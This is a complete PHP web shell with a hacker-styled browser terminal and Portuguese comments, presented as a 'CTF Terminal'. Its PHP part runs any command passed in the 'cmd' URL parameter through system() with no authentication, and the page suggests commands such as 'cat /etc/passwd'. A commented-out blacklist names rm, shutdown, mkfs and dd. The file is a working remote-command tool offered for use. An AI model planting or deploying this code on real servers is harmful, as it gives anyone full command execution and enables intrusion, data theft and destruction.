<?php
// Parte PHP: Execução do comando se 'cmd' estiver presente na URL
if (isset($_GET["cmd"])) {
    header('Content-Type: text/plain; charset=UTF-8'); // Garante que a saída seja texto puro
    $command = $_GET["cmd"];
    
    // Medida de segurança básica (opcional, mas recomendada para CTFs onde você não quer quebrar tudo)
    // $blacklist = ['rm', 'reboot', 'shutdown', 'mkfs', 'dd', 'mv / ']; // Adicione comandos perigosos
    // foreach ($blacklist as $blocked_command) {
    //     if (strpos($command, $blocked_command) !== false) {
    //         echo "Comando bloqueado por segurança.";
    //         exit;
    //     }
    // }

    // Executa o comando e envia a saída diretamente
    ob_start(); // Inicia o buffer de saída
    system($command . " 2>&1", $return_var); // "2>&1" redireciona stderr para stdout
    $output = ob_get_contents(); // Pega o conteúdo do buffer
    ob_end_clean(); // Limpa e desliga o buffer

    if ($output === false || $output === '') {
        // Se não houve saída, podemos enviar uma mensagem ou apenas nada.
        // Para depuração, é útil saber que o comando executou sem saída.
        // echo "[Comando executado, sem saída]";
    } else {
        echo $output;
    }
    exit; // Importante para não renderizar o HTML abaixo ao executar um comando
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHELL_v1.1 :: CTF Terminal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&family=Share+Tech+Mono&display=swap');

        :root {
            --bg-color: #0a0a0a;
            --text-color: #00ff41; /* Verde hacker clássico */
            --prompt-color: #00ccff; /* Azul ciano para o prompt */
            --border-color: #00ff41;
            --error-color: #ff4141;
            --font-family: 'Share Tech Mono', 'VT323', monospace;
        }

        * {
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: var(--font-family);
            font-size: 16px;
            overflow: hidden; /* Evita scrollbars no body */
        }

        #terminal-container {
            width: 100%;
            height: 100%;
            padding: 15px;
            display: flex;
            flex-direction: column;
            border: 2px solid var(--border-color);
            box-shadow: 0 0 15px var(--border-color), inset 0 0 10px rgba(0, 255, 65, 0.3);
            animation: flicker 0.15s infinite alternate;
        }

        @keyframes flicker {
            0% { opacity: 0.95; }
            100% { opacity: 1; }
        }

        #output {
            flex-grow: 1;
            overflow-y: auto;
            white-space: pre-wrap; 
            word-wrap: break-word; 
            padding-right: 10px; 
            margin-bottom: 10px;
            scrollbar-width: thin;
            scrollbar-color: var(--text-color) var(--bg-color);
        }

        #output::-webkit-scrollbar {
            width: 8px;
        }
        #output::-webkit-scrollbar-track {
            background: var(--bg-color);
        }
        #output::-webkit-scrollbar-thumb {
            background-color: var(--text-color);
            border-radius: 4px;
            border: 1px solid var(--bg-color);
        }

        .output-line {
            margin-bottom: 5px;
            line-height: 1.3; /* Melhora a legibilidade */
        }
        .output-line.command-echo .prompt {
            color: var(--prompt-color);
        }
        .output-line.command-echo .command-text {
            color: var(--text-color); 
        }
        .output-line.error {
            color: var(--error-color);
            font-weight: bold;
        }
        .output-line.info { /* Para mensagens como "sem saída" */
            color: #888; /* Cinza */
        }


        #input-line {
            display: flex;
            align-items: center;
            border-top: 1px dashed var(--border-color);
            padding-top: 10px;
        }

        #prompt {
            color: var(--prompt-color);
            margin-right: 8px;
            /* Removida a animação de piscar do prompt de texto */
        }

        #commandInput {
            flex-grow: 1;
            background-color: transparent;
            border: none;
            color: var(--text-color);
            font-family: inherit;
            font-size: inherit;
            outline: none;
            padding: 5px 0;
            /* O cursor piscando será o padrão do navegador para inputs focados */
        }

        body::after {
            content: " ";
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.15) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 9999; 
            background-size: 100% 3px, 2px 100%;
            pointer-events: none; 
        }
        
        .header-title {
            text-align: center;
            font-size: 1.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 5px var(--text-color);
        }
    </style>
</head>
<body>
    <div id="terminal-container">
        <div class="header-title">--[ LKS TERMINAL v1.1 ]--</div>
        <div id="output">
            <p class="output-line">Conectado ao sistema... Bem-vindo, Agente.<br>Digite 'help' para comandos básicos ou execute diretamente.</p>
            <p class="output-line">Ex: <span style="color:var(--prompt-color)">ls -la</span>, <span style="color:var(--prompt-color)">whoami</span>, <span style="color:var(--prompt-color)">id</span>, <span style="color:var(--prompt-color)">cat /etc/passwd</span></p>
            <p class="output-line">----------------------------------------------------</p>
        </div>
        <div id="input-line">
            <span id="prompt">root@ctf-server:~#</span>
            <input type="text" id="commandInput" autofocus autocomplete="off" spellcheck="false">
        </div>
    </div>

    <script>
        const commandInput = document.getElementById('commandInput');
        const outputDiv = document.getElementById('output');
        const promptText = document.getElementById('prompt').textContent;
        const commandHistory = [];
        let historyIndex = -1;

        commandInput.focus(); // Garante o foco

        commandInput.addEventListener('keydown', async function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = commandInput.value.trim();
                
                // Adiciona ao histórico (se não for repetido e não for vazio)
                if (command !== "" && (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== command)) {
                    commandHistory.push(command);
                }
                historyIndex = commandHistory.length; 

                // Echo do comando no output
                const commandEchoLine = document.createElement('div');
                commandEchoLine.classList.add('output-line', 'command-echo');
                commandEchoLine.innerHTML = `<span class="prompt">${escapeHtml(promptText)}</span> <span class="command-text">${escapeHtml(command)}</span>`;
                outputDiv.appendChild(commandEchoLine);
                
                // Limpa o input ANTES de processar, mas o valor já está na variável 'command'
                commandInput.value = ''; 

                if (command === '') { // Se o comando estiver vazio após o trim, não faz nada além de ecoar (se desejar)
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                    commandInput.focus();
                    return;
                }

                if (command.toLowerCase() === 'clear' || command.toLowerCase() === 'cls') {
                    outputDiv.innerHTML = '<div class="output-line info">[Terminal limpo]</div>';
                } else if (command.toLowerCase() === 'help') {
                    const helpText = `
                Comandos disponíveis:
                help          - Mostra esta ajuda.
                clear / cls   - Limpa a tela do terminal.
                history       - Mostra o histórico de comandos.
                <qualquer comando do sistema> - Ex: ls, cat, whoami, id, etc.
                    `;
                    const helpOutput = document.createElement('div');
                    helpOutput.classList.add('output-line');
                    helpOutput.textContent = helpText; // Usar textContent para preservar a formatação pre
                    outputDiv.appendChild(helpOutput);
                } else if (command.toLowerCase() === 'history') {
                    const historyOutput = document.createElement('div');
                    historyOutput.classList.add('output-line');
                    if (commandHistory.length > 1) { 
                        historyOutput.textContent = "Histórico de comandos:\n" + commandHistory.slice(0, -1).map((cmd, i) => `  ${i}: ${escapeHtml(cmd)}`).join('\n');
                    } else {
                        historyOutput.textContent = "Nenhum comando no histórico (além deste).";
                    }
                    outputDiv.appendChild(historyOutput);
                } else {
                    // Envia o comando para o backend
                    try {
                        console.log(`Enviando comando: ${command}`); // Log para depuração
                        const response = await fetch(`?cmd=${encodeURIComponent(command)}`);
                        console.log(`Resposta recebida, status: ${response.status}`); // Log

                        if (!response.ok) {
                            const errorText = await response.text(); // Tenta pegar o corpo do erro
                            throw new Error(`Erro HTTP: ${response.status} ${response.statusText}. Detalhes: ${errorText}`);
                        }
                        const resultText = await response.text();
                        
                        const resultLine = document.createElement('div');
                        resultLine.classList.add('output-line');
                        if (resultText.trim() === '') {
                            resultLine.textContent = "[Comando executado, sem saída]";
                            resultLine.classList.add('info');
                        } else {
                            resultLine.textContent = resultText; 
                        }
                        outputDiv.appendChild(resultLine);

                    } catch (error) {
                        console.error("Erro ao executar comando:", error); // Log do erro no console do navegador
                        const errorLine = document.createElement('div');
                        errorLine.classList.add('output-line', 'error');
                        errorLine.textContent = `Erro: ${error.message}`;
                        outputDiv.appendChild(errorLine);
                    }
                }
                
                outputDiv.scrollTop = outputDiv.scrollHeight;
                commandInput.focus();

            } else if (event.key === 'ArrowUp') {
                event.preventDefault();
                if (commandHistory.length > 0 && historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length); 
                }
            } else if (event.key === 'ArrowDown') {
                event.preventDefault();
                if (historyIndex < commandHistory.length -1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length); 
                } else if (historyIndex === commandHistory.length -1) {
                    historyIndex++;
                    commandInput.value = ""; 
                }
            } else if (event.key === 'Tab') {
                event.preventDefault();
                addTextAtCursor('    '); 
            }
        });

        function escapeHtml(unsafe) {
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
}


        function addTextAtCursor(text) {
            const start = commandInput.selectionStart;
            const end = commandInput.selectionEnd;
            const originalValue = commandInput.value;
            commandInput.value = originalValue.substring(0, start) + text + originalValue.substring(end);
            commandInput.selectionStart = commandInput.selectionEnd = start + text.length;
        }

        document.getElementById('terminal-container').addEventListener('click', function(event) {
            if (event.target.id !== 'commandInput' && event.target.tagName !== 'INPUT') { 
                commandInput.focus();
            }
        });

        // Mensagem inicial um pouco mais elaborada
        function initialBoot() {
            const bootSequence = [
                "Iniciando sistema...",
                "Estabelecendo conexão segura...",
                "Interface SHELL_v1.1 carregada.",
                "Pronto para entrada de comandos.",
                "----------------------------------------------------",
                "Bem-vindo, Agente. Use 'help' para assistência."
            ];
            let i = 0;
            function typeLine() {
                if (i < bootSequence.length) {
                    const line = document.createElement('div');
                    line.classList.add('output-line');
                    if (bootSequence[i].startsWith("---")) {
                         line.textContent = bootSequence[i];
                    } else {
                        line.textContent = bootSequence[i]; // Poderia adicionar efeito de digitação aqui
                    }
                    outputDiv.appendChild(line);
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                    i++;
                    setTimeout(typeLine, Math.random() * 150 + 50); // Delay aleatório para efeito
                } else {
                    commandInput.focus();
                }
            }
            // Limpa as mensagens padrão e inicia a sequência de boot
            outputDiv.innerHTML = ''; 
            typeLine();
        }
        // Descomente a linha abaixo para usar a sequência de boot animada
        // initialBoot(); 
        // Se não quiser a animação, as mensagens estáticas no HTML já funcionam.
        // Se for usar initialBoot(), remova as mensagens iniciais do HTML do #output.
        // Por padrão, deixarei as mensagens estáticas para simplicidade.

    </script>
</body>
</html>